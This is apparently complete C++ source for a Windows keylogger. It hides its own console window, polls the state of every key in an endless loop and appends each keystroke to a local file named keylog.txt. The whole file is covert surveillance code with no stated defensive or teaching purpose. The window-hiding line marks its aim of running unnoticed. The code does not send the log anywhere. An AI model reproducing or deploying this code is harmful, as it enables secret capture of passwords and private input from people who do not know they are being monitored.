#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

void LogKeyStroke(string key) {
    ofstream logFile;
    logFile.open("keylog.txt", ios::app);
    logFile << key;
    logFile.close();
}

string TranslateKey(int key) {
    switch (key) {
        case VK_BACK: return "[BACKSPACE]";
        case VK_RETURN: return "\n";
        case VK_SPACE: return " ";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_ESCAPE: return "[ESC]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        default:
            char ch = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
            return string(1, ch);
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); // optional: hide window

    while (true) {
        Sleep(10);
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                string keyStr = TranslateKey(key);
                LogKeyStroke(keyStr);
            }
        }
    }

    return 0;
}

